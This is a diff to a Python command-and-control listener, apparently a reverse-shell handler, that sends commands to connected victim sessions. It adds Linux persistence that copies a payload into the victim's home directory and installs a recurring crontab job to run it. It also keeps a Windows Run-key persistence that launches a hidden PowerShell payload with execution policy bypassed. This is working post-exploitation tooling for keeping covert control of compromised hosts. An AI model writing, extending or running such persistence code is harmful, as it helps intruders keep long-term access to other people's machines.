@@ -39,12 +39,14 @@ def listener_handler():
         user_input = input(
             "Enter an IPv4 address or a network interface name: ")
         if check_input(user_input) is not False:
+            global host_ip
             host_ip = check_input(user_input)
             print(f'lhost ==> {host_ip}')
             break
         else:
             print(
                 f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
+    global host_port
     host_port = input('[*] Enter Local Port to listen on: ')
     print(f'lport ==> {host_port}')
     sock.bind((host_ip, int(host_port)))
@@ -89,6 +91,19 @@ def message_handler():
             pass
 
 
+# Get user input minutes (1-59) for crontab persistence
+def get_crontab_minutes(prompt):
+    while True:
+        try:
+            user_input = int(input(prompt))
+            if user_input < 1 or user_input > 59:
+                print("Please enter a positive integer between 1 and 59")
+            else:
+                return user_input
+        except ValueError:
+            print("Invalid input. Please enter a valid integer.")
+
+
 # Individual session handling with options: exit, backgroung, help (TODO), add/remove persistence
 def session_handler(session_id):
     while True:
@@ -104,6 +119,7 @@ def session_handler(session_id):
             print('Help menu here!')
             pass
         if message == 'add persistence':
+
             if sessions[num - 1][5] == 'Windows':
                 payload_name = input(
                     '[*] Enter the name of the binary in current directory to be add to persistence: ')
@@ -116,30 +132,59 @@ def session_handler(session_id):
                     message = f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /t REG_SZ /d "powershell -exec bypass -nop -w hidden C:\\Users\\Public\\{payload_name}"'
                     print(
                         f'[!] Trying to add {payload_name} as a start-up binary. Please run <remove persistence> to clean up the registry [!]')
-            else:
+            elif sessions[num - 1][5] == 'Linux':
                 payload_name = input(
                     '[*] Enter the name of the python file in current directory to be add to persistence: ')
-                message = f'echo "Performing persistence command for non-windows"'
+                frequency = get_crontab_minutes(
+                    '[*] Enter frequency for payload to execute in minutes (1-59): ')
+                message = f'cp ./{payload_name} /home/{sessions[num - 1][3]}/{payload_name}'
+                session_id.send(message.encode())
+                response = inbound_message(session_id)
+                time.sleep(1)
+                if f'No such file' not in response:
+                    print(response)
+                    message = f'echo "*/{frequency} * * * * python3 /home/{sessions[num - 1][3]}/{payload_name}" | crontab -'
+                    print(
+                        f'[!] Trying to add {payload_name} to crontab. Please run <remove persistence> to clean up the crontab [!]')
+                    session_id.send(message.encode())
+                    response = inbound_message(session_id)
+                    print(response)
+                    message = ''
+            else:
+                print(
+                    f'No available persistence technique for {sessions[num - 1][5]} platform.')
+                message = ''
 
         if message == 'remove persistence':
+
             if sessions[num - 1][5] == 'Windows':
                 message = f'reg delete "HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\\Run" /v knock /f'
                 print('[!] Trying to clean up the HKCU registry [!]')
                 print(
                     f'[!] Make sure to remove the start-up binary: C:\\Users\\Public\\{payload_name} [!]')
+            elif sessions[num - 1][5] == 'Linux':
+                message = f'crontab -l | grep -v "python3 /home/{sessions[num - 1][3]}/{payload_name}" | crontab -'
+                session_id.send(message.encode())
+                response = inbound_message(session_id)
+                print('[!] Trying to clean up the crontab job [!]')
+                print(response)
+                print(
+                    f'[!] Make sure to remove payload file: /home/{sessions[num - 1][3]}/{payload_name} [!]')
+                message = ''
             else:
-                print('[!] Not yet implemented')
+                print(
+                    f'No available persistence removal technique for {sessions[num - 1][5]} platform.')
                 message = ''
 
         if not message:
             continue
+
         outbound_message(session_id, message)
 
         response = inbound_message(session_id)
-        if response == 'exit':
-            print('[-] The client has terminated the session.')
-            session_id.close()
-            break
+        if response == '[*] Success':
+            response = ''
+
         print(response)
 
 
